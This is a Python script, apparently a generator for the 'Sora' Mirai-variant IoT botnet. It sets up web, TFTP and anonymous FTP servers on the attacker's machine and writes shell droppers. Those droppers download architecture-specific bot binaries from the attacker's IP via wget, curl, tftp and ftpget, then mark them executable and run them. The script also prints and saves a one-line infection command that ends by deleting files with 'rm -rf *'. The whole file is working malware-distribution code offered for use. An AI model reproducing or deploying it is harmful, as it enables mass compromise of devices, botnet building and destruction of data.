import subprocess, sys, urllib
ip = urllib.urlopen('http://api.ipify.org').read()
exec_bin = "robben"
exec_name = "Payload"
bin_prefix = "sora."
bin_directory = "bins"
archs = ["x86",               #1
"mips",                       #2
"mpsl",                       #3
"arm4",                       #4
"arm5",                       #5
"arm6",                       #6
"arm7",                       #7
"ppc",                        #8
"m68k",                       #9
"sh4"]                        #10
def run(cmd):
    subprocess.call(cmd, shell=True)
print("\033[01;37mPlease wait while your payload generating.")
print(" ")
run("yum install httpd -y &> /dev/null")
run("service httpd start &> /dev/null")
run("yum install xinetd tftp tftp-server -y &> /dev/null")
run("yum install vsftpd -y &> /dev/null")
run("service vsftpd start &> /dev/null")
run('''echo "service tftp
{
	socket_type             = dgram
	protocol                = udp
	wait                    = yes
    user                    = root
    server                  = /usr/sbin/in.tftpd
    server_args             = -s -c /var/lib/tftpboot
    disable                 = no
    per_source              = 11
    cps                     = 100 2
    flags                   = IPv4
}
" > /etc/xinetd.d/tftp''')	
run("service xinetd start &> /dev/null")
run('''echo "listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address='''+ ip +'''
listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')
run("service vsftpd restart &> /dev/null")
run("service xinetd restart &> /dev/null")
print("Creating .sh Bins")
print(" ")
run('echo "#!/bin/bash" > /var/lib/tftpboot/sora.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/sora.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/sora.sh')
run('echo "#!/bin/bash" > /var/lib/tftpboot/sora2.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/sora2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/sora2.sh')
run('echo "#!/bin/bash" > /var/www/html/sora.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/sora2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/sora2.sh')
run('echo "#!/bin/bash" > /var/ftp/sora1.sh')
run('echo "ulimit -n 1024" >> /var/ftp/sora1.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/ftp/sora1.sh')
for i in archs:
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/www/html/sora.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' '+bin_prefix+i+' '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/ftp/sora1.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/lib/tftpboot/sora.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r '+bin_prefix+i+' -g ' + ip + ';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/lib/tftpboot/sora2.sh')    
run("service xinetd restart &> /dev/null")
run("service httpd restart &> /dev/null")
run('echo -e "ulimit -n 99999" >> ~/.bashrc')
run("cp /var/www/html/sora.sh /var/www/html/pay")
run("cp /var/www/html/sora.sh /var/www/html/bin")
run("cp /var/www/html/sora.sh /var/www/html/yarn")

print("\x1b[0;31mPayload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/sora.sh; curl -O http://" + ip + "/sora.sh; chmod 777 sora.sh; sh sora.sh; tftp " + ip + " -c get sora.sh; chmod 777 sora.sh; sh sora.sh; tftp -r sora2.sh -g " + ip + "; chmod 777 sora2.sh; sh sora2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " sora1.sh sora1.sh; sh sora1.sh; rm -rf sora.sh sora.sh sora2.sh sora1.sh; rm -rf *\x1b[0m")
print("")
complete_payload = ("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/sora.sh; curl -O http://" + ip + "/sora.sh; chmod 777 sora.sh; sh sora.sh; tftp " + ip + " -c get sora.sh; chmod 777 sora.sh; sh sora.sh; tftp -r sora2.sh -g " + ip + "; chmod 777 sora2.sh; sh sora2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " sora1.sh sora1.sh; sh sora1.sh; rm -rf sora.sh sora.sh sora2.sh sora1.sh; rm -rf *")
file = open("payload.txt","w+")
file.write(complete_payload)
file.close()
exit()
raw_input("\033[01;37mTi-am generat si salvat payload-ul in payload.txt\033[0m")
